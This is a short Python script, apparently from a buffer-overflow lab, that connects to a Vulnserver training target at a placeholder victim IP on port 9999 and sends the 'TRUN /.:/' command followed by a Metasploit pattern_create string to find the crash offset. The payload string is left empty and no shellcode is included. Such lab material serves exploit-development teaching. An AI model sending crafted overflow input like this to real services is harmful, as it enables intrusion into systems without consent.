#! /usr/bin/python
import sys
import socket

# generate it using pattern_create.rb
# pattern_create.rb -l <bits_offset>
offset = ""
# Enter the port vulnserver is listening on
PORT = 9999
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('YOUR_VICTIM_IP', PORT))
    s.send(('TRUN /.:/' + offset))
    s.close()
except:
    print("Some error in connecting to the vulnserver running")
    sys.exit()
